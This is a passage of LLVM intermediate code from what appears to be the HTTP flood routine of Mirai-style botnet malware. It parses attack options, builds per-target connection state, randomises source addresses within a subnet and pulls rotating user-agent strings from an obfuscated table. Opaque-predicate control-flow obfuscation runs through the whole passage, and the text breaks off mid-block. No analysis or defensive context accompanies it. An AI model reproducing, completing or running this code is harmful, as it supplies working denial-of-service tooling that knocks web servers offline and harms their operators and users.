  %81 = load i8, i8* %15, align 1
  %82 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %83 = call i8* @attack_get_opt_str(i8 zeroext %81, %struct.attack_option* %82, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %83, i8** %25, align 8
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 23, i32 1)
  store i32 %86, i32* %26, align 4
  %87 = load i8, i8* %15, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 7, i32 80)
  %90 = trunc i32 %89 to i16
  store i16 %90, i16* %27, align 2
  %91 = bitcast [10241 x i8]* %28 to i8*
  call void @llvm.memset.p0i8.i64(i8* %91, i8 0, i64 10241, i32 16, i1 false)
  %92 = load i8*, i8** %24, align 8
  %93 = icmp eq i8* %92, null
  %94 = load i32, i32* @x.17
  %95 = load i32, i32* @y.18
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %93, label %105, label %102

; <label>:102:                                    ; preds = %originalBBpart2
  %103 = load i8*, i8** %25, align 8
  %104 = icmp eq i8* %103, null
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %102, %originalBBpart2
  br label %4157

; <label>:106:                                    ; preds = %102
  %107 = load i32, i32* @x.17
  %108 = load i32, i32* @y.18
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %106
  %115 = load i8*, i8** %25, align 8
  %116 = call i32 @util_strlen(i8* %115)
  %117 = icmp sgt i32 %116, 255
  %118 = load i32, i32* @x.17
  %119 = load i32, i32* @y.18
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %117, label %126, label %127

; <label>:126:                                    ; preds = %originalBBpart24
  br label %4157

; <label>:127:                                    ; preds = %originalBBpart24
  %128 = load i8*, i8** %24, align 8
  %129 = call i32 @util_strlen(i8* %128)
  %130 = icmp sgt i32 %129, 127
  br i1 %130, label %131, label %148

; <label>:131:                                    ; preds = %127
  %132 = load i32, i32* @x.17
  %133 = load i32, i32* @y.18
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %131
  %140 = load i32, i32* @x.17
  %141 = load i32, i32* @y.18
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %4157

; <label>:148:                                    ; preds = %127
  %149 = load i8*, i8** %23, align 8
  %150 = call i32 @util_strlen(i8* %149)
  %151 = icmp sgt i32 %150, 9
  br i1 %151, label %152, label %169

; <label>:152:                                    ; preds = %148
  %153 = load i32, i32* @x.17
  %154 = load i32, i32* @y.18
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %152
  %161 = load i32, i32* @x.17
  %162 = load i32, i32* @y.18
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %4157

; <label>:169:                                    ; preds = %148
  store i32 0, i32* %18, align 4
  br label %170

; <label>:170:                                    ; preds = %201, %169
  %171 = load i32, i32* %18, align 4
  %172 = load i8*, i8** %23, align 8
  %173 = call i32 @util_strlen(i8* %172)
  %174 = icmp slt i32 %171, %173
  br i1 %174, label %175, label %204

; <label>:175:                                    ; preds = %170
  %176 = load i8*, i8** %23, align 8
  %177 = load i32, i32* %18, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds i8, i8* %176, i64 %178
  %180 = load i8, i8* %179, align 1
  %181 = sext i8 %180 to i32
  %182 = icmp sge i32 %181, 97
  br i1 %182, label %183, label %200

; <label>:183:                                    ; preds = %175
  %184 = load i8*, i8** %23, align 8
  %185 = load i32, i32* %18, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8, i8* %184, i64 %186
  %188 = load i8, i8* %187, align 1
  %189 = sext i8 %188 to i32
  %190 = icmp sle i32 %189, 122
  br i1 %190, label %191, label %200

; <label>:191:                                    ; preds = %183
  %192 = load i8*, i8** %23, align 8
  %193 = load i32, i32* %18, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8, i8* %192, i64 %194
  %196 = load i8, i8* %195, align 1
  %197 = sext i8 %196 to i32
  %198 = sub nsw i32 %197, 32
  %199 = trunc i32 %198 to i8
  store i8 %199, i8* %195, align 1
  br label %200

; <label>:200:                                    ; preds = %191, %183, %175
  br label %201

; <label>:201:                                    ; preds = %200
  %202 = load i32, i32* %18, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %18, align 4
  br label %170

; <label>:204:                                    ; preds = %170
  %205 = load i32, i32* %26, align 4
  %206 = icmp sgt i32 %205, 512
  br i1 %206, label %207, label %224

; <label>:207:                                    ; preds = %204
  %208 = load i32, i32* @x.17
  %209 = load i32, i32* @y.18
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %207
  store i32 512, i32* %26, align 4
  %216 = load i32, i32* @x.17
  %217 = load i32, i32* @y.18
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %224

; <label>:224:                                    ; preds = %originalBBpart216, %204
  %225 = load i32, i32* @x.17
  %226 = load i32, i32* @y.18
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %224
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %233 = load i32, i32* %26, align 4
  %234 = sext i32 %233 to i64
  %235 = call noalias i8* @calloc(i64 %234, i64 3140) #6
  %236 = bitcast i8* %235 to %struct.attack_http_state*
  store %struct.attack_http_state* %236, %struct.attack_http_state** %21, align 8
  store i32 0, i32* %17, align 4
  %237 = load i32, i32* @x.17
  %238 = load i32, i32* @y.18
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %245

; <label>:245:                                    ; preds = %490, %originalBBpart220
  %246 = load i32, i32* %17, align 4
  %247 = load i32, i32* %26, align 4
  %248 = icmp slt i32 %246, %247
  br i1 %248, label %249, label %493

; <label>:249:                                    ; preds = %245
  %250 = load i32, i32* @x.17
  %251 = load i32, i32* @y.18
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %249
  %258 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %259 = load i32, i32* %17, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %258, i64 %260
  %262 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %261, i32 0, i32 1
  store i8 0, i8* %262, align 4
  %263 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %264 = load i32, i32* %17, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %263, i64 %265
  %267 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %266, i32 0, i32 0
  store i32 -1, i32* %267, align 4
  %268 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %269 = load i32, i32* %17, align 4
  %270 = load i8, i8* %13, align 1
  %271 = zext i8 %270 to i32
  %272 = srem i32 %269, %271
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %268, i64 %273
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %274, i32 0, i32 1
  %276 = load i32, i32* %275, align 4
  %277 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %278 = load i32, i32* %17, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %280, i32 0, i32 4
  store i32 %276, i32* %281, align 4
  %282 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %283 = load i32, i32* %17, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %282, i64 %284
  %286 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %285, i32 0, i32 6
  %287 = getelementptr inbounds [257 x i8], [257 x i8]* %286, i32 0, i32 0
  %288 = load i8*, i8** %25, align 8
  %289 = call i32 @util_strcpy(i8* %287, i8* %288)
  %290 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %291 = load i32, i32* %17, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %290, i64 %292
  %294 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i32 0, i32 6
  %295 = getelementptr inbounds [257 x i8], [257 x i8]* %294, i64 0, i64 0
  %296 = load i8, i8* %295, align 4
  %297 = sext i8 %296 to i32
  %298 = icmp ne i32 %297, 47
  %299 = load i32, i32* @x.17
  %300 = load i32, i32* @y.18
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart237, label %originalBB22alteredBB

originalBBpart237:                                ; preds = %originalBB22
  br i1 %298, label %307, label %335

; <label>:307:                                    ; preds = %originalBBpart237
  %308 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %309 = load i32, i32* %17, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %308, i64 %310
  %312 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i32 0, i32 6
  %313 = getelementptr inbounds [257 x i8], [257 x i8]* %312, i32 0, i32 0
  %314 = getelementptr inbounds i8, i8* %313, i64 1
  %315 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %316 = load i32, i32* %17, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %315, i64 %317
  %319 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %318, i32 0, i32 6
  %320 = getelementptr inbounds [257 x i8], [257 x i8]* %319, i32 0, i32 0
  %321 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %322 = load i32, i32* %17, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %324, i32 0, i32 6
  %326 = getelementptr inbounds [257 x i8], [257 x i8]* %325, i32 0, i32 0
  %327 = call i32 @util_strlen(i8* %326)
  %328 = sext i32 %327 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %314, i8* %320, i64 %328, i32 1, i1 false)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %330 = load i32, i32* %17, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 6
  %334 = getelementptr inbounds [257 x i8], [257 x i8]* %333, i64 0, i64 0
  store i8 47, i8* %334, align 4
  br label %335

; <label>:335:                                    ; preds = %307, %originalBBpart237
  %336 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %337 = load i32, i32* %17, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %336, i64 %338
  %340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %339, i32 0, i32 10
  %341 = getelementptr inbounds [9 x i8], [9 x i8]* %340, i32 0, i32 0
  %342 = load i8*, i8** %23, align 8
  %343 = call i32 @util_strcpy(i8* %341, i8* %342)
  %344 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %345 = load i32, i32* %17, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i32 0, i32 9
  %349 = getelementptr inbounds [9 x i8], [9 x i8]* %348, i32 0, i32 0
  %350 = load i8*, i8** %23, align 8
  %351 = call i32 @util_strcpy(i8* %349, i8* %350)
  %352 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %353 = load i32, i32* %17, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %355, i32 0, i32 7
  %357 = getelementptr inbounds [129 x i8], [129 x i8]* %356, i32 0, i32 0
  %358 = load i8*, i8** %24, align 8
  %359 = call i32 @util_strcpy(i8* %357, i8* %358)
  %360 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %361 = load i32, i32* %17, align 4
  %362 = load i8, i8* %13, align 1
  %363 = zext i8 %362 to i32
  %364 = srem i32 %361, %363
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i64 %365
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %366, i32 0, i32 2
  %368 = load i8, i8* %367, align 4
  %369 = zext i8 %368 to i32
  %370 = icmp slt i32 %369, 32
  br i1 %370, label %371, label %417

; <label>:371:                                    ; preds = %335
  %372 = load i32, i32* @x.17
  %373 = load i32, i32* @y.18
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %371
  %380 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %381 = load i32, i32* %17, align 4
  %382 = load i8, i8* %13, align 1
  %383 = zext i8 %382 to i32
  %384 = srem i32 %381, %383
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %380, i64 %385
  %387 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i32 0, i32 1
  %388 = load i32, i32* %387, align 4
  %389 = call i32 @ntohl(i32 %388) #7
  %390 = call i32 @rand_next()
  %391 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %392 = load i32, i32* %17, align 4
  %393 = load i8, i8* %13, align 1
  %394 = zext i8 %393 to i32
  %395 = srem i32 %392, %394
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i64 %396
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %397, i32 0, i32 2
  %399 = load i8, i8* %398, align 4
  %400 = zext i8 %399 to i32
  %401 = lshr i32 %390, %400
  %402 = add i32 %389, %401
  %403 = call i32 @htonl(i32 %402) #7
  %404 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %405 = load i32, i32* %17, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %407, i32 0, i32 4
  store i32 %403, i32* %408, align 4
  %409 = load i32, i32* @x.17
  %410 = load i32, i32* @y.18
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart262, label %originalBB39alteredBB

originalBBpart262:                                ; preds = %originalBB39
  br label %417

; <label>:417:                                    ; preds = %originalBBpart262, %335
  %418 = call i32 @rand_next()
  %419 = urem i32 %418, 5
  switch i32 %419, label %481 [
    i32 0, label %420
    i32 1, label %429
    i32 2, label %438
    i32 3, label %447
    i32 4, label %472
  ]

; <label>:420:                                    ; preds = %417
  call void @table_unlock_val(i8 zeroext 54)
  %421 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %422 = load i32, i32* %17, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %421, i64 %423
  %425 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %424, i32 0, i32 5
  %426 = getelementptr inbounds [512 x i8], [512 x i8]* %425, i32 0, i32 0
  %427 = call i8* @table_retrieve_val(i32 54, i32* null)
  %428 = call i32 @util_strcpy(i8* %426, i8* %427)
  call void @table_lock_val(i8 zeroext 54)
  br label %481

; <label>:429:                                    ; preds = %417
  call void @table_unlock_val(i8 zeroext 55)
  %430 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %431 = load i32, i32* %17, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %430, i64 %432
  %434 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %433, i32 0, i32 5
  %435 = getelementptr inbounds [512 x i8], [512 x i8]* %434, i32 0, i32 0
  %436 = call i8* @table_retrieve_val(i32 55, i32* null)
  %437 = call i32 @util_strcpy(i8* %435, i8* %436)
  call void @table_lock_val(i8 zeroext 55)
  br label %481

; <label>:438:                                    ; preds = %417
  call void @table_unlock_val(i8 zeroext 56)
  %439 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %440 = load i32, i32* %17, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %439, i64 %441
  %443 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %442, i32 0, i32 5
  %444 = getelementptr inbounds [512 x i8], [512 x i8]* %443, i32 0, i32 0
  %445 = call i8* @table_retrieve_val(i32 56, i32* null)
  %446 = call i32 @util_strcpy(i8* %444, i8* %445)
  call void @table_lock_val(i8 zeroext 56)
  br label %481

; <label>:447:                                    ; preds = %417
  %448 = load i32, i32* @x.17
  %449 = load i32, i32* @y.18
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %447
  call void @table_unlock_val(i8 zeroext 57)
  %456 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %457 = load i32, i32* %17, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %459, i32 0, i32 5
  %461 = getelementptr inbounds [512 x i8], [512 x i8]* %460, i32 0, i32 0
  %462 = call i8* @table_retrieve_val(i32 57, i32* null)
  %463 = call i32 @util_strcpy(i8* %461, i8* %462)
  call void @table_lock_val(i8 zeroext 57)
  %464 = load i32, i32* @x.17
  %465 = load i32, i32* @y.18
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %481

; <label>:472:                                    ; preds = %417
  call void @table_unlock_val(i8 zeroext 58)
  %473 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %474 = load i32, i32* %17, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %476, i32 0, i32 5
  %478 = getelementptr inbounds [512 x i8], [512 x i8]* %477, i32 0, i32 0
  %479 = call i8* @table_retrieve_val(i32 58, i32* null)
  %480 = call i32 @util_strcpy(i8* %478, i8* %479)
  call void @table_lock_val(i8 zeroext 58)
  br label %481

; <label>:481:                                    ; preds = %472, %originalBBpart266, %438, %429, %420, %417
  %482 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %483 = load i32, i32* %17, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %482, i64 %484
  %486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %485, i32 0, i32 6
  %487 = getelementptr inbounds [257 x i8], [257 x i8]* %486, i32 0, i32 0
  %488 = load i8*, i8** %25, align 8
  %489 = call i32 @util_strcpy(i8* %487, i8* %488)
  br label %490

; <label>:490:                                    ; preds = %481
  %491 = load i32, i32* %17, align 4
  %492 = add nsw i32 %491, 1
  store i32 %492, i32* %17, align 4
  br label %245

; <label>:493:                                    ; preds = %245
  %494 = load i32, i32* @x.17
  %495 = load i32, i32* @y.18
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %493
  %502 = load i32, i32* @x.17
  %503 = load i32, i32* @y.18
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %510

; <label>:510:                                    ; preds = %4156, %1520, %1510, %originalBBpart270
  store i32 0, i32* %31, align 4
  %511 = call i64 @time(i64* null) #6
  %512 = trunc i64 %511 to i32
  store i32 %512, i32* %35, align 4
  br label %513

; <label>:513:                                    ; preds = %510
  %514 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %29, i32 0, i32 0
  %515 = getelementptr inbounds [16 x i64], [16 x i64]* %514, i64 0, i64 0
  %516 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %515) #6, !srcloc !1
  %517 = extractvalue { i64, i64* } %516, 0
  %518 = extractvalue { i64, i64* } %516, 1
  %519 = trunc i64 %517 to i32
  store i32 %519, i32* %36, align 4
  %520 = ptrtoint i64* %518 to i64
  %521 = trunc i64 %520 to i32
  store i32 %521, i32* %37, align 4
  br label %522

; <label>:522:                                    ; preds = %513
  br label %523

; <label>:523:                                    ; preds = %522
  %524 = load i32, i32* @x.17
  %525 = load i32, i32* @y.18
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %523
  %532 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %30, i32 0, i32 0
  %533 = getelementptr inbounds [16 x i64], [16 x i64]* %532, i64 0, i64 0
  %534 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %533) #6, !srcloc !2
  %535 = extractvalue { i64, i64* } %534, 0
  %536 = extractvalue { i64, i64* } %534, 1
  %537 = trunc i64 %535 to i32
  store i32 %537, i32* %38, align 4
  %538 = ptrtoint i64* %536 to i64
  %539 = trunc i64 %538 to i32
  store i32 %539, i32* %39, align 4
  %540 = load i32, i32* @x.17
  %541 = load i32, i32* @y.18
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %548

; <label>:548:                                    ; preds = %originalBBpart274
  store i32 0, i32* %17, align 4
  br label %549

; <label>:549:                                    ; preds = %1504, %548
  %550 = load i32, i32* @x.17
  %551 = load i32, i32* @y.18
  %552 = sub i32 %550, 1
  %553 = mul i32 %550, %552
  %554 = urem i32 %553, 2
  %555 = icmp eq i32 %554, 0
  %556 = icmp slt i32 %551, 10
  %557 = or i1 %555, %556
  br i1 %557, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %549
  %558 = load i32, i32* %17, align 4
  %559 = load i32, i32* %26, align 4
  %560 = icmp slt i32 %558, %559
  %561 = load i32, i32* @x.17
  %562 = load i32, i32* @y.18
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %560, label %569, label %1507

; <label>:569:                                    ; preds = %originalBBpart278
  %570 = load %struct.attack_http_state*, %struct.attack_http_state** %21, align 8
  %571 = load i32, i32* %17, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %570, i64 %572
  store %struct.attack_http_state* %573, %struct.attack_http_state** %34, align 8
  %574 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %575 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %574, i32 0, i32 1
  %576 = load i8, i8* %575, align 4
  %577 = zext i8 %576 to i32
  %578 = icmp eq i32 %577, 1
  br i1 %578, label %579, label %623

; <label>:579:                                    ; preds = %569
  %580 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %581 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %580, i32 0, i32 12
  %582 = load i32, i32* %581, align 4
  %583 = icmp ne i32 %582, 0
  br i1 %583, label %584, label %587

; <label>:584:                                    ; preds = %579
  %585 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %585, i32 0, i32 1
  store i8 4, i8* %586, align 4
  br label %606

; <label>:587:                                    ; preds = %579
  %588 = load i32, i32* @x.17
  %589 = load i32, i32* @y.18
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
